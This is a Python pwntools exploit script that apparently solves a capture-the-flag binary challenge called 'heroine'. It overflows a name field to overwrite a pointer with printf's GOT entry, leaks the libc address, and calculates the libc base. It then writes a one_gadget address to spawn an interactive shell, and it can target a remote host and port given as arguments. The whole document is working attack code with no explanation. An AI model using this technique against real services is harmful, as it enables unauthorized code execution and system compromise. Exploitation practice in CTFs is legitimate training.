#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('heroine.bin_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+585
b *main+521
b *editName+160
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def addName(value):
    io.sendlineafter(b">>>", b"2")
    io.sendlineafter(b">>>", value)
    

def editName(name, value):
    io.sendlineafter(b">>>", b"4")
    io.sendlineafter(b">>>", name)
    io.sendlineafter(b">>>", value)


def showName():
    io.sendlineafter(b">>>", b"1")


def solve():
    payload = b"B"*56 + p64(exe.got["printf"])

    for i in range(3):
        addName(chr(0x41 + i).encode() * 8)

    editName(b"B"*8, payload)
    showName()

    io.recvuntil(b"Cyber Heroine: ")
    io.recvlines(2)
    printf = u64(io.recvline().split(b" ")[-1].strip().ljust(8, b"\x00"))
    base = printf - libc.sym["printf"]
    info("libc base: %#x", base)

    og = base + 0xe3b04

    addName(p64(og))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
